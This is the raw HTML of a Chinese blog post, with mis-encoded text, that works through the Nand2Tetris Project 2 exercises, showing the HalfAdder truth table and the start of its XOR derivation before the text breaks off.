            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/747323638159757/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é‡‘éŠ€éŠ…éµ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T02:19:45.000Z" title="Sat Dec 13 2025 02:19:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body .octicon{display:inline-block;fill:currentColor;vertical-align:text-bottom}.markdown-body .anchor{float:left;line-height:1;margin-left:-20px;padding-right:4px}.markdown-body .anchor:focus{outline:none}.markdown-body h1 .octicon-link,.markdown-body h2 .octicon-link,.markdown-body h3 .octicon-link,.markdown-body h4 .octicon-link,.markdown-body h5 .octicon-link,.markdown-body h6 .octicon-link{color:#1b1f23;vertical-align:middle;visibility:hidden}.markdown-body h1:hover .anchor,.markdown-body h2:hover .anchor,.markdown-body h3:hover .anchor,.markdown-body h4:hover .anchor,.markdown-body h5:hover .anchor,.markdown-body h6:hover .anchor{text-decoration:none}.markdown-body h1:hover .anchor .octicon-link,.markdown-body h2:hover .anchor .octicon-link,.markdown-body h3:hover .anchor .octicon-link,.markdown-body h4:hover .anchor .octicon-link,.markdown-body h5:hover .anchor .octicon-link,.markdown-body h6:hover .anchor .octicon-link{visibility:visible}.markdown-body h1:hover .anchor .octicon-link:before,.markdown-body h2:hover .anchor .octicon-link:before,.markdown-body h3:hover .anchor .octicon-link:before,.markdown-body h4:hover .anchor .octicon-link:before,.markdown-body h5:hover .anchor .octicon-link:before,.markdown-body h6:hover .anchor .octicon-link:before{width:16px;height:16px;content:" ";display:inline-block;background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' aria-hidden='true'%3E%3Cpath fill-rule='evenodd' d='M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z'/%3E%3C/svg%3E")}.markdown-body{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;color:#24292e;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;font-size:16px;line-height:1.5;word-wrap:break-word}.markdown-body details{display:block}.markdown-body summary{display:list-item}.markdown-body a{background-color:initial}.markdown-body a:active,.markdown-body a:hover{outline-width:0}.markdown-body strong{font-weight:inherit;font-weight:bolder}.markdown-body h1{margin:.67em 0}.markdown-body img{border-style:none}.markdown-body code,.markdown-body kbd,.markdown-body pre{font-family:monospace,monospace;font-size:1em}.markdown-body hr{box-sizing:initial;overflow:visible}.markdown-body input{font:inherit;margin:0;overflow:visible}.markdown-body [type=checkbox]{box-sizing:border-box;padding:0}.markdown-body *{box-sizing:border-box}.markdown-body input{font-family:inherit;font-size:inherit;line-height:inherit}.markdown-body a{color:#0366d6;text-decoration:none}.markdown-body a:hover{text-decoration:underline}.markdown-body strong{font-weight:600}.markdown-body hr{height:0;margin:15px 0;overflow:hidden;background:transparent;border-bottom:1px solid #dfe2e5}.markdown-body hr:after,.markdown-body hr:before{display:table;content:""}.markdown-body hr:after{clear:both}.markdown-body table{border-spacing:0;border-collapse:collapse}.markdown-body td,.markdown-body th{padding:0}.markdown-body details summary{cursor:pointer}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:0;margin-bottom:0}.markdown-body h1{font-size:32px}.markdown-body h1,.markdown-body h2{font-weight:600}.markdown-body h2{font-size:24px}.markdown-body h3{font-size:20px}.markdown-body h3,.markdown-body h4{font-weight:600}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:14px}.markdown-body h5,.markdown-body h6{font-weight:600}.markdown-body h6{font-size:12px}.markdown-body p{margin-top:0;margin-bottom:10px}.markdown-body blockquote{margin:0}.markdown-body ol,.markdown-body ul{padding-left:0;margin-top:0;margin-bottom:0}.markdown-body ol ol,.markdown-body ul ol{list-style-type:lower-roman}.markdown-body ol ol ol,.markdown-body ol ul ol,.markdown-body ul ol ol,.markdown-body ul ul ol{list-style-type:lower-alpha}.markdown-body dd{margin-left:0}.markdown-body code,.markdown-body pre{font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px}.markdown-body pre{margin-top:0;margin-bottom:0}.markdown-body input::-webkit-inner-spin-button,.markdown-body input::-webkit-outer-spin-button{margin:0;-webkit-appearance:none;appearance:none}.markdown-body :checked+.radio-label{position:relative;z-index:1;border-color:#0366d6}.markdown-body .border{border:1px solid #e1e4e8!important}.markdown-body .border-0{border:0!important}.markdown-body .border-bottom{border-bottom:1px solid #e1e4e8!important}.markdown-body .rounded-1{border-radius:3px!important}.markdown-body .bg-white{background-color:#fff!important}.markdown-body .bg-gray-light{background-color:#fafbfc!important}.markdown-body .text-gray-light{color:#6a737d!important}.markdown-body .pl-3,.markdown-body .px-3{padding-left:16px!important}.markdown-body .px-3{padding-right:16px!important}.markdown-body .f6{font-size:12px!important}.markdown-body .lh-condensed{line-height:1.25!important}.markdown-body .text-bold{font-weight:600!important}.markdown-body .pl-c{color:#6a737d}.markdown-body .pl-c1,.markdown-body .pl-s .pl-v{color:#005cc5}.markdown-body .pl-e,.markdown-body .pl-en{color:#6f42c1}.markdown-body .pl-s .pl-s1,.markdown-body .pl-smi{color:#24292e}.markdown-body .pl-ent{color:#22863a}.markdown-body .pl-k{color:#d73a49}.markdown-body .pl-pds,.markdown-body .pl-s,.markdown-body .pl-s .pl-pse .pl-s1,.markdown-body .pl-sr,.markdown-body .pl-sr .pl-cce,.markdown-body .pl-sr .pl-sra,.markdown-body .pl-sr .pl-sre{color:#032f62}.markdown-body .pl-smw,.markdown-body .pl-v{color:#e36209}.markdown-body .pl-bu{color:#b31d28}.markdown-body .pl-ii{color:#fafbfc;background-color:#b31d28}.markdown-body .pl-c2{color:#fafbfc;background-color:#d73a49}.markdown-body .pl-c2:before{content:"^M"}.markdown-body .pl-sr .pl-cce{font-weight:700;color:#22863a}.markdown-body .pl-ml{color:#735c0f}.markdown-body .pl-mh,.markdown-body .pl-mh .pl-en,.markdown-body .pl-ms{font-weight:700;color:#005cc5}.markdown-body .pl-mi{font-style:italic;color:#24292e}.markdown-body .pl-mb{font-weight:700;color:#24292e}.markdown-body .pl-md{color:#b31d28;background-color:#ffeef0}.markdown-body .pl-mi1{color:#22863a;background-color:#f0fff4}.markdown-body .pl-mc{color:#e36209;background-color:#ffebda}.markdown-body .pl-mi2{color:#f6f8fa;background-color:#005cc5}.markdown-body .pl-mdr{font-weight:700;color:#6f42c1}.markdown-body .pl-ba{color:#586069}.markdown-body .pl-sg{color:#959da5}.markdown-body .pl-corl{text-decoration:underline;color:#032f62}.markdown-body .mb-0{margin-bottom:0!important}.markdown-body .my-2{margin-bottom:8px!important;margin-top:8px!important}.markdown-body .pl-0{padding-left:0!important}.markdown-body .py-0{padding-top:0!important;padding-bottom:0!important}.markdown-body .pl-1{padding-left:4px!important}.markdown-body .pl-2{padding-left:8px!important}.markdown-body .py-2{padding-top:8px!important;padding-bottom:8px!important}.markdown-body .pl-3{padding-left:16px!important}.markdown-body .pl-4{padding-left:24px!important}.markdown-body .pl-5{padding-left:32px!important}.markdown-body .pl-6{padding-left:40px!important}.markdown-body .pl-7{padding-left:48px!important}.markdown-body .pl-8{padding-left:64px!important}.markdown-body .pl-9{padding-left:80px!important}.markdown-body .pl-10{padding-left:96px!important}.markdown-body .pl-11{padding-left:112px!important}.markdown-body .pl-12{padding-left:128px!important}.markdown-body hr{border-bottom-color:#eee}.markdown-body kbd{display:inline-block;padding:3px 5px;font:11px SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;line-height:10px;color:#444d56;vertical-align:middle;background-color:#fafbfc;border:1px solid #d1d5da;border-radius:3px;box-shadow:inset 0 -1px 0 #d1d5da}.markdown-body:after,.markdown-body:before{display:table;content:""}.markdown-body:after{clear:both}.markdown-body&gt;:first-child{margin-top:0!important}.markdown-body&gt;:last-child{margin-bottom:0!important}.markdown-body a:not([href]){color:inherit;text-decoration:none}.markdown-body blockquote,.markdown-body details,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{margin-top:0;margin-bottom:16px}.markdown-body hr{height:.25em;padding:0;margin:24px 0;background-color:#e1e4e8;border:0}.markdown-body blockquote{padding:0 1em;color:#6a737d;border-left:.25em solid #dfe2e5}.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:24px;margin-bottom:16px;font-weight:600;line-height:1.25}.markdown-body h1{font-size:2em}.markdown-body h1,.markdown-body h2{padding-bottom:.3em;border-bottom:1px solid #eaecef}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.25em}.markdown-body h4{font-size:1em}.markdown-body h5{font-size:.875em}.markdown-body h6{font-size:.85em;color:#6a737d}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:0;margin-bottom:0}.markdown-body li{word-wrap:break-all}.markdown-body li&gt;p{margin-top:16px}.markdown-body li+li{margin-top:.25em}.markdown-body dl{padding:0}.markdown-body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:600}.markdown-body dl dd{padding:0 16px;margin-bottom:16px}.markdown-body table{display:block;width:100%;overflow:auto}.markdown-body table th{font-weight:600}.markdown-body table td,.markdown-body table th{padding:6px 13px;border:1px solid #dfe2e5}.markdown-body table tr{background-color:#fff;border-top:1px solid #c6cbd1}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}.markdown-body img{max-width:100%;box-sizing:initial;background-color:#fff}.markdown-body img[align=right]{padding-left:20px}.markdown-body img[align=left]{padding-right:20px}.markdown-body code{padding:.2em .4em;margin:0;font-size:85%;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body pre{word-wrap:normal}.markdown-body pre&gt;code{padding:0;margin:0;font-size:100%;word-break:normal;white-space:pre;background:transparent;border:0}.markdown-body .highlight{margin-bottom:16px}.markdown-body .highlight pre{margin-bottom:0;word-break:normal}.markdown-body .highlight pre,.markdown-body pre{padding:16px;overflow:auto;font-size:85%;line-height:1.45;background-color:#f6f8fa;border-radius:3px}.markdown-body pre code{display:inline;max-width:auto;padding:0;margin:0;overflow:visible;line-height:inherit;word-wrap:normal;background-color:initial;border:0}.markdown-body .commit-tease-sha{display:inline-block;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:90%;color:#444d56}.markdown-body .full-commit .btn-outline:not(:disabled):hover{color:#005cc5;border-color:#005cc5}.markdown-body .blob-wrapper{overflow-x:auto;overflow-y:hidden}.markdown-body .blob-wrapper-embedded{max-height:240px;overflow-y:auto}.markdown-body .blob-num{width:1%;min-width:50px;padding-right:10px;padding-left:10px;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;line-height:20px;color:rgba(27,31,35,.3);text-align:right;white-space:nowrap;vertical-align:top;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-body .blob-num:hover{color:rgba(27,31,35,.6)}.markdown-body .blob-num:before{content:attr(data-line-number)}.markdown-body .blob-code{position:relative;padding-right:10px;padding-left:10px;line-height:20px;vertical-align:top}.markdown-body .blob-code-inner{overflow:visible;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;color:#24292e;word-wrap:normal;white-space:pre}.markdown-body .pl-token.active,.markdown-body .pl-token:hover{cursor:pointer;background:#ffea7f}.markdown-body .tab-size[data-tab-size="1"]{-moz-tab-size:1;tab-size:1}.markdown-body .tab-size[data-tab-size="2"]{-moz-tab-size:2;tab-size:2}.markdown-body .tab-size[data-tab-size="3"]{-moz-tab-size:3;tab-size:3}.markdown-body .tab-size[data-tab-size="4"]{-moz-tab-size:4;tab-size:4}.markdown-body .tab-size[data-tab-size="5"]{-moz-tab-size:5;tab-size:5}.markdown-body .tab-size[data-tab-size="6"]{-moz-tab-size:6;tab-size:6}.markdown-body .tab-size[data-tab-size="7"]{-moz-tab-size:7;tab-size:7}.markdown-body .tab-size[data-tab-size="8"]{-moz-tab-size:8;tab-size:8}.markdown-body .tab-size[data-tab-size="9"]{-moz-tab-size:9;tab-size:9}.markdown-body .tab-size[data-tab-size="10"]{-moz-tab-size:10;tab-size:10}.markdown-body .tab-size[data-tab-size="11"]{-moz-tab-size:11;tab-size:11}.markdown-body .tab-size[data-tab-size="12"]{-moz-tab-size:12;tab-size:12}.markdown-body .task-list-item{list-style-type:none}.markdown-body .task-list-item+.task-list-item{margin-top:3px}.markdown-body .task-list-item input{margin:0 .2em .25em -1.6em;vertical-align:middle}</style><style data-highlight="" data-highlight-key="an-old-hope">.hljs-comment,.hljs-quote{color:#b6b18b}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#eb3c54}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#e7ce56}.hljs-attribute{color:#ee7c2b}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#4fb4d7}.hljs-section,.hljs-title{color:#78bb65}.hljs-keyword,.hljs-selector-tag{color:#b45ea4}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#1c1d21;color:#c0c5ce}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">èƒŒæ™¯</h2>
<p>è®©æˆ‘ä»¬æŒ‰ç…§Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nand2tetris.org%2Fcourse" target="_blank" title="https://www.nand2tetris.org/course" ref="nofollow noopener noreferrer">From Nand to Tetris</a>Â é‡ŒÂ <code>Project 2</code>Â çš„è¦æ±‚ï¼Œæ¥å®Œæˆä¸‹åˆ—çš„è®¾è®¡ã€‚</p>
<ol>
<li>å®ç°åŠåŠ å™¨(<code>HalfAdder</code>)</li>
<li>å®ç°å…¨åŠ å™¨(<code>FullAdder</code>)</li>
<li>å®ç° <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>16</mn></mrow><annotation encoding="application/x-tex">16</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">16</span></span></span></span></span> ä½åŠ æ³•å™¨(<code>Add16</code>)</li>
<li>å®ç° <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>16</mn></mrow><annotation encoding="application/x-tex">16</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">16</span></span></span></span></span> ä½è‡ªå¢å™¨(<code>Inc16</code>)</li>
<li>å®ç°ç®—æœ¯é€»è¾‘å•å…ƒ(<code>ALU</code>) (todo)</li>
</ol>
<h2 data-id="heading-1">æ­£æ–‡</h2>
<h3 data-id="heading-2">1. å®ç° <code>HalfAdder</code></h3>
<p>å‰å¾€Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fnand2tetris.github.io%2Fweb-ide%2Fchip%2F" target="_blank" title="https://nand2tetris.github.io/web-ide/chip/" ref="nofollow noopener noreferrer">Nand to Tetris Online IDE</a>ï¼Œé€‰æ‹©Â <code>Project 2</code>Â é‡Œçš„Â <code>HalfAdder</code>ï¼Œæ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤º â¬‡ï¸</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a2693541f9b4ba2bc3626b93bb58289~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeR6YqA6YqF6ZC1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766211366&amp;x-signature=bu9%2BnTa2qxModhqK26NOsgwTGdo%3D" alt="image.png" loading="lazy"/></p>
<p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯ç”¨ <code>Project 1</code> é‡Œå·²ç»å®ç°çš„å„ç§ <code>chip</code> å®ç°ä¸€ä¸ª <code>HalfAdder</code>ã€‚</p>
<ul>
<li>è¾“å…¥æ˜¯
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">a</span></span></span></span></span></li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span></span></span></span></span></li>
</ul>
</li>
<li>è¾“å‡ºæ˜¯
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span></span></span></span></span></li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>a</mi><mi>r</mi><mi>r</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">carry</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">rry</span></span></span></span></span></li>
</ul>
</li>
</ul>
<p>æˆ‘ä»¬å¯ä»¥ä»å®ƒçš„çœŸå€¼è¡¨å…¥æ‰‹ â¬‡ï¸</p>



































<table><thead><tr><th><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">a</span></span></span></span></span></th><th><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span></span></span></span></span></th><th><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">sum</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span></span></span></span></span></th><th><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>a</mi><mi>r</mi><mi>r</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">carry</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">rry</span></span></span></span></span></th></tr></thead><tbody><tr><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td></tr><tr><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td></tr><tr><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td></tr><tr><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span></td><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span></td></tr></tbody></table>
<p>å¯è§</p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><mi>m</mi><mo>=</mo><mo stretchy="false">(</mo><mi mathvariant="normal">Â¬</mi><mi>a</mi><mo>âˆ§</mo><mi>b</mi><mo stretchy="false">)</mo><mo>âˆ¨</mo><mo stretchy="false">(</mo><mi>a</mi><mo>âˆ§</mo><mi mathvariant="normal">Â¬</mi><mi>b</mi><mo stretchy="false">)</mo><mo>=</mo><mi>a</mi><mo>âŠ•</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">sum=(\neg{a}\land b) \lor (a\land \neg{b})=a\oplus b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">a</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ¨</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">b</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord 